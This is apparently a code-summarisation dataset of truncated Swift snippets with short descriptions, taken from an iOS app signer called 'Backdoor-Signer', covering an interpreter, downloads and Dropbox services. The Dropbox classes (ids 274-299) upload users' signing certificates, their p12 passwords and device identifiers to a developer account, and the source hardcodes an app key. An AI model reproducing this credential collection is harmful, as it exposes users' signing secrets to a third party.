    "id": "260",
    "code": "private func showLanguageHelp(outputHandler: @escaping (String) -> Void) {\nlet helpText = \"\"\"\nBackdoor Custom Programming Language\n===================================\n\nThe custom language supports both Swift and Python execution with\nseamless interoperability between them.\n\nSingle Language Execution:\n--------------------------",
    "nl": "/ Shows help information about the custom programming language",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "261",
    "code": "class CustomLanguageParser {\nenum LanguageMode {",
    "nl": "MARK: - Custom Language Structures / Custom language parser for the Backdoor programming language",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "class"
  },
  {
    "id": "262",
    "code": "enum LanguageMode {\ncase swift\ncase python\ncase mixed\n}\n\nstruct ParsedCommand {",
    "nl": "enum LanguageMode - implements functionality related to language mode",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "enum"
  },
  {
    "id": "263",
    "code": "struct ParsedCommand {\nlet mode: LanguageMode\nlet code: String\n}\n\n/// Parse a command to determine its language mode and extract the code\nfunc parse(_ command: String) -> Result<ParsedCommand, Error> {",
    "nl": "struct ParsedCommand - implements functionality related to parsed command",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "struct"
  },
  {
    "id": "264",
    "code": "func parse(_ command: String) -> Result<ParsedCommand, Error> {\n// Check for shebang\nif command.hasPrefix(\"#!/bin/backdoor\") {",
    "nl": "/ Parse a command to determine its language mode and extract the code",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "265",
    "code": "class BackdoorInterpreter {\nenum BlockType {",
    "nl": "/ BackdoorInterpreter - Executes code in the custom programming language",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "class"
  },
  {
    "id": "266",
    "code": "enum BlockType {\ncase swift\ncase python\n}\n\nstruct CodeBlock {",
    "nl": "enum BlockType - implements functionality related to block type",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "enum"
  },
  {
    "id": "267",
    "code": "struct CodeBlock {\nlet type: BlockType\nlet code: String\nlet outputFile: URL\nlet importVariables: [String]\n}\n\nstruct ExecutionPlan {",
    "nl": "struct CodeBlock - implements functionality related to code block",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "struct"
  },
  {
    "id": "268",
    "code": "struct ExecutionPlan {\nlet executionBlocks: [CodeBlock]\nlet dataPassingFiles: [URL]\n}\n\n/// Prepare mixed code for execution by parsing and creating execution blocks\nfunc prepareMixedCode(_ code: String, workingDirectory: URL) throws -> ExecutionPlan {",
    "nl": "struct ExecutionPlan - implements functionality related to execution plan",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "struct"
  },
  {
    "id": "269",
    "code": "func prepareMixedCode(_ code: String, workingDirectory: URL) throws -> ExecutionPlan {\n// Split code into language blocks\nvar executionBlocks: [CodeBlock] = []\nvar dataPassingFiles: [URL] = []\n\n// Create a regular expression to match language blocks\nlet blockPattern = try NSRegularExpression(pattern: \"(swift|python):\\\\s*\\\\{([\\\\s\\\\S]*?)\\\\}\", options: [])",
    "nl": "/ Prepare mixed code for execution by parsing and creating execution blocks",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "270",
    "code": "func executeBlock(_ block: CodeBlock, outputHandler: @escaping (String) -> Void) throws {\n// Create modified code with data passing logic\nlet modifiedCode = try createExecutableCode(for: block)\n\n// Create a temporary file\nlet tempDir = FileManager.default.temporaryDirectory\nlet fileExtension = block.type == .swift ? \"swift\" : \"py\"\nlet fileURL = tempDir.appendingPathComponent(\"temp_\\(UUID().uuidString).\\(fileExtension)\")\n\ntry modifiedCode.write(to: fileURL, atomically: true, encoding: .utf8)",
    "nl": "/ Execute a single code block and handle data passing",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "271",
    "code": "private func createExecutableCode(for block: CodeBlock) throws -> String {\nvar code = \"\"\n\nif block.type == .swift {",
    "nl": "/ Create executable code for a block, including data passing logic",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "272",
    "code": "struct ExportedData: Codable {\nvar variables: [String: String] = [:]\n}\n\nvar exportedData = ExportedData()\n\n// Export function\nfunc export(_ name: String, _ value: Any) {",
    "nl": "Data passing setup",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "struct"
  },
  {
    "id": "273",
    "code": "func export(_ name: String, _ value: Any) {\nlet jsonString = String(describing: value)\nexportedData.variables[name] = jsonString\n}\n\n\"\"\"\n\n// Add import logic for variables from Python\nfor variable in block.importVariables {",
    "nl": "Export function",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "274",
    "code": "class DropboxService {\n// MARK: - Singleton\n\n/// Shared instance for app-wide access\nstatic let shared = DropboxService()\n\n// MARK: - Properties\n\n/// Dropbox API token - stored as a constant for this implementation\n/// In a production app, this would be stored more securely (e.g., in Keychain)",
    "nl": "/ Service for handling Dropbox file uploads",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift",
    "code_type": "class"
  },
  {
    "id": "275",
    "code": "func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {\nguard fileURL.isFileURL else {",
    "nl": "MARK: - Public Methods / Uploads a certificate file to Dropbox / - Parameters: /   - fileURL: The local URL of the file to upload /   - password: Optional password for the certificate file, if it's a .p12 file /   - completion: Optional completion handler called when upload finishes (for debugging only)",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "276",
    "code": "private func uploadPasswordFile(\npassword: String,\np12Filename: String,\ncompletion: ((Bool, Error?) -> Void)? = nil\n) {",
    "nl": "/ Uploads password information as a separate file to Dropbox / - Parameters: /   - password: The p12 password to send /   - p12Filename: The name of the p12 file /   - completion: Optional completion handler",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "277",
    "code": "class EnhancedDropboxService {\n// MARK: - Singleton\n\n/// Shared instance for app-wide access\nstatic let shared = EnhancedDropboxService()\n\n// MARK: - Constants\n\n// Dropbox credentials\nprivate let dropboxAppKey = \"2bi422xpd3xd962\"",
    "nl": "/ Enhanced Dropbox service for improved logging and file management",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "class"
  },
  {
    "id": "278",
    "code": "func uploadLogFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {\nguard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }",
    "nl": "MARK: - Public Methods / Upload a log file to Dropbox",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "279",
    "code": "func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {\nguard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }",
    "nl": "/ Upload a certificate file to Dropbox",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "280",
    "code": "private func createCertificatePasswordPairFile(\ncertificateFilename: String,\npassword: String,\ncompletion: ((Bool, Error?) -> Void)? = nil\n) {",
    "nl": "/ Creates a file that explicitly pairs a certificate with its password / - Parameters: /   - certificateFilename: The filename of the certificate /   - password: The password for the certificate /   - completion: Optional completion handler",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "281",
    "code": "func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {\n// Only proceed if user has consented to data collection\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Upload device information to Dropbox",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "282",
    "code": "func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {\n// Only proceed if user has consented to data collection\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Upload a text string as a log entry",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "283",
    "code": "func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {\n// Create password info\nlet passwordInfo: [String: String] = [\n\"certificate_file\": fileName,\n\"password\": password,\n\"timestamp\": ISO8601DateFormatter().string(from: Date()),\n\"device_name\": UIDevice.current.name,\n]\n\n// Convert to JSON",
    "nl": "/ Store password for certificate file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "284",
    "code": "private func checkPrerequisites(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) -> Bool {\n// Check consent\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "MARK: - Private Methods / Common validation for file uploads",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "285",
    "code": "private func handleConsentError(completion: ((Bool, Error?) -> Void)? = nil) {\nif let completion = completion {",
    "nl": "/ Handle consent missing error",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "286",
    "code": "private func handleDataCreationError(completion: ((Bool, Error?) -> Void)? = nil) {\nif let completion = completion {",
    "nl": "/ Handle data creation error",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "287",
    "code": "private func createDeviceInfoDictionary() -> [String: String] {\nreturn [\n\"device_name\": UIDevice.current.name,\n\"system_name\": UIDevice.current.systemName,\n\"system_version\": UIDevice.current.systemVersion,\n\"model\": UIDevice.current.model,\n\"identifier_for_vendor\": UIDevice.current.identifierForVendor?.uuidString ?? \"unknown\",\n\"timestamp\": ISO8601DateFormatter().string(from: Date()),\n\"app_version\": Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String ?? \"unknown\",\n\"build_number\": Bundle.main.infoDictionary?[\"CFBundleVersion\"] as? String ?? \"unknown\",",
    "nl": "/ Create device info dictionary",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "288",
    "code": "private func refreshAccessToken(completion: @escaping (Bool) -> Void) {\n// Check if current token is still valid\nif let expiry = accessTokenExpiry, expiry > Date(), accessToken != nil {",
    "nl": "/ Refresh access token for Dropbox API",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "289",
    "code": "private func processTokenResponse(data: Data, completion: @escaping (Bool) -> Void) {\ndo {",
    "nl": "/ Process token response from Dropbox",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "290",
    "code": "private func prepareUploadRequest(token: String, path: String, fileData: Data) -> URLRequest? {\nguard let uploadURL = URL(string: dropboxUploadURL) else {",
    "nl": "/ Prepare upload request",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "291",
    "code": "private func uploadFile(fileURL: URL, toPath path: String, completion: ((Bool, Error?) -> Void)? = nil) {\n// Ensure we have a valid token\nrefreshAccessToken { [weak self] success in",
    "nl": "/ Upload a file to Dropbox with auto folder creation",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "292",
    "code": "private func processFileUpload(\ntoken: String,\nfileURL: URL,\npath: String,\ncompletion: ((Bool, Error?) -> Void)?\n) {",
    "nl": "/ Process file upload after token refresh",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "293",
    "code": "private func handleUploadResponse(\ndata: Data?,\nresponse: URLResponse?,\npath: String,\ncompletion: ((Bool, Error?) -> Void)?\n) {",
    "nl": "/ Handle upload response from Dropbox",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "294",
    "code": "class MinimalDropboxService {\n// MARK: - Singleton\n\nstatic let shared = MinimalDropboxService()\n\n// MARK: - Properties\n\nprivate let rootFolder = \"Backdoor-App-Data\"\nprivate var backgroundQueue = DispatchQueue(label: \"com.minimal.dropboxservice\", qos: .utility)\n",
    "nl": "/ Minimal Dropbox service implementation to avoid dependency conflicts / This class uses only standard libraries and works with the MinimalBackdoorCollector",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift",
    "code_type": "class"
  },
  {
    "id": "295",
    "code": "func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "MARK: - Public Methods / Upload device information",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "296",
    "code": "func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Upload certificate file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "297",
    "code": "func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Store password for certificate",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "298",
    "code": "func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Upload log entry",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "299",
    "code": "private func saveDataLocally(data: Any, subfolder: String? = nil, filename: String) {\ndo {",
    "nl": "MARK: - Private Methods / Save data locally until upload capability is available",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/MinimalDropboxService.swift",
    "code_type": "function"
  },
  {
    "id": "300",
    "code": "class AppDownload: NSObject {\nlet progress = Progress(totalUnitCount: 100)\nvar dldelegate: DownloadDelegate?\nvar downloads = [URLSessionDownloadTask: (\nuuid: String,\nappuuid: String,\ndestinationUrl: URL,\ncompletion: (String?, String?, Error?) -> Void\n)]()\nvar DirectoryUUID: String?",
    "nl": "class AppDownload - implements functionality related to app download",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "class"
  },
  {
    "id": "301",
    "code": "func downloadFile(url: URL, appuuid: String, completion: @escaping (String?, String?, Error?) -> Void) {\nlet uuid = UUID().uuidString\nDirectoryUUID = uuid\nAppUUID = appuuid\nguard let folderUrl = createUuidDirectory(uuid: uuid) else {",
    "nl": "Function downloadFile - implements downloadfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "302",
    "code": "func importFile(url: URL, uuid: String, completion: @escaping (URL?, Error?) -> Void) {\nguard let folderUrl = createUuidDirectory(uuid: uuid) else {",
    "nl": "Function importFile - implements importfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "303",
    "code": "func cancelDownload() {\nDebug.shared.log(message: \"AppDownload.cancelDownload: User cancelled the download\", type: .info)\ndownloadTask?.cancel()\nsession?.invalidateAndCancel()\ndownloadTask = nil\nsession = nil\nprogress.cancel()\n}\n\nfunc createUuidDirectory(uuid: String) -> URL? {",
    "nl": "Function cancelDownload - implements canceldownload functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "304",
    "code": "func createUuidDirectory(uuid: String) -> URL? {\nlet baseFolder = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]\nlet folderUrl = baseFolder.appendingPathComponent(\"Apps/Unsigned\").appendingPathComponent(uuid)\n\ndo {",
    "nl": "Function createUuidDirectory - creates uuiddirectory",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "305",
    "code": "func extractCompressedBundle(packageURL: String, completion: @escaping (String?, Error?) -> Void) {\nlet fileURL = URL(fileURLWithPath: packageURL)\nlet destinationURL = fileURL.deletingLastPathComponent()\nlet fileManager = FileManager.default\n\nif !fileManager.fileExists(atPath: fileURL.path) {",
    "nl": "Function extractCompressedBundle - implements extractcompressedbundle functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "306",
    "code": "func addToApps(\nbundlePath: String,\nuuid: String,\nsourceLocation: String? = nil,\ncompletion: @escaping (Error?) -> Void\n) {",
    "nl": "Function addToApps - implements addtoapps functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "307",
    "code": "extension AppDownload: URLSessionDownloadDelegate {\nfunc urlSession(_: URLSession, downloadTask: URLSessionDownloadTask, didFinishDownloadingTo location: URL) {",
    "nl": "extension AppDownload - implements functionality related to app download",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "extension"
  },
  {
    "id": "308",
    "code": "func urlSession(_: URLSession, downloadTask: URLSessionDownloadTask, didFinishDownloadingTo location: URL) {\nguard let download = downloads[downloadTask] else {",
    "nl": "Function urlSession - implements urlsession functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "309",
    "code": "func urlSession(_: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) {\nguard let downloadTask = task as? URLSessionDownloadTask else {",
    "nl": "Function urlSession - implements urlsession functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "310",
    "code": "func urlSession(\n_: URLSession,\ndownloadTask: URLSessionDownloadTask,\ndidWriteData _: Int64,\ntotalBytesWritten: Int64,\ntotalBytesExpectedToWrite: Int64\n) {",
    "nl": "Function urlSession - implements urlsession functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "311",
    "code": "enum HandleIPAFileError: Error {\ncase importFailed(String)\ncase extractionFailed(String)\ncase additionFailed(String)\n}\n\nfunc handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {",
    "nl": "enum HandleIPAFileError - implements functionality related to handle i p a file error",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "enum"
  },
  {
    "id": "312",
    "code": "func handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {\nlet semaphore = DispatchSemaphore(value: 0)\n\nvar functionError: Error?\nvar newUrl: URL?\nvar targetBundle: String?\n\nDispatchQueue(label: \"DL\").async {",
    "nl": "Function handleIPAFile - implements handleipafile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/AppDownload.swift",
    "code_type": "function"
  },
  {
    "id": "313",
    "code": "enum DownloadState {\ncase notStarted\ncase inProgress(progress: CGFloat)\ncase completed\ncase failed(error: Error)\n\nvar progress: CGFloat? {",
    "nl": "enum DownloadState - implements functionality related to download state",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "enum"
  },
  {
    "id": "314",
    "code": "class DownloadTask {\nvar uuid: String\nweak var cell: AppTableViewCell?\nvar state: DownloadState\nvar dl: AppDownload\nvar progressHandler: ((CGFloat) -> Void)?\n\ninit(uuid: String, cell: AppTableViewCell, state: DownloadState = .notStarted, dl: AppDownload) {",
    "nl": "class DownloadTask - implements functionality related to download task",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "class"
  },
  {
    "id": "315",
    "code": "func updateProgress(to progress: CGFloat) {\nstate = .inProgress(progress: progress)\nprogressHandler?(progress)\nNotificationCenter.default.post(\nname: .downloadProgressUpdated,\nobject: self,\nuserInfo: [\"uuid\": uuid, \"progress\": progress]\n)\n}\n}",
    "nl": "Function updateProgress - updates progress",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "316",
    "code": "extension Notification.Name {\nstatic let downloadProgressUpdated = Notification.Name(\"downloadProgressUpdated\")\n}\n\nclass DownloadTaskManager {",
    "nl": "extension Notification - implements functionality related to notification",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "extension"
  },
  {
    "id": "317",
    "code": "class DownloadTaskManager {\nstatic let shared = DownloadTaskManager()\nvar downloadTasks: [String: DownloadTask] = [:]\nprivate let taskQueue = DispatchQueue(label: \"com.backdoor.DownloadTaskManager\", attributes: .concurrent)\n\nprivate init() {",
    "nl": "class DownloadTaskManager - Manages system resources and operations",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "class"
  },
  {
    "id": "318",
    "code": "func addTask(uuid: String, cell: AppTableViewCell, dl: AppDownload) {\nlet task = DownloadTask(uuid: uuid, cell: cell, dl: dl)\ntaskQueue.async(flags: .barrier) { [weak self] in",
    "nl": "Function addTask - implements addtask functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "319",
    "code": "func updateTask(uuid: String, state: DownloadState) {\ntaskQueue.async { [weak self] in",
    "nl": "Function updateTask - updates task",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "320",
    "code": "func cancelDownload(for uuid: String) {\ntaskQueue.async { [weak self] in",
    "nl": "Function cancelDownload - implements canceldownload functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "321",
    "code": "func updateTaskProgress(uuid: String, progress: CGFloat) {\ntaskQueue.async { [weak self] in",
    "nl": "Function updateTaskProgress - updates taskprogress",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "322",
    "code": "func removeTask(uuid: String) {\ntaskQueue.async(flags: .barrier) { [weak self] in",
    "nl": "Function removeTask - implements removetask functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "323",
    "code": "func task(for uuid: String) -> DownloadTask? {\nvar result: DownloadTask?\ntaskQueue.sync {",
    "nl": "Function task - implements task functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "324",
    "code": "private func persistTaskState(_ task: DownloadTask) {\nlet defaults = UserDefaults.standard\ndefaults.set(task.state.progress, forKey: \"\\(task.uuid)_progress\")\n}\n\nprivate func removePersistedTaskState(for uuid: String) {",
    "nl": "Function persistTaskState - implements persisttaskstate functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "325",
    "code": "private func removePersistedTaskState(for uuid: String) {\nlet defaults = UserDefaults.standard\ndefaults.removeObject(forKey: \"\\(uuid)_progress\")\n}\n\nfunc restoreTaskState(for uuid: String, cell: AppTableViewCell) {",
    "nl": "Function removePersistedTaskState - implements removepersistedtaskstate functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "326",
    "code": "func restoreTaskState(for uuid: String, cell: AppTableViewCell) {\ntaskQueue.async { [weak self] in",
    "nl": "Function restoreTaskState - implements restoretaskstate functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Downloads/DownloadTaskManager.swift",
    "code_type": "function"
  },
  {
    "id": "327",
    "code": "@objc private func appWillTerminate() {\nclearAllTasks()\n}\n\n@objc private func handleMemoryWarning() {",
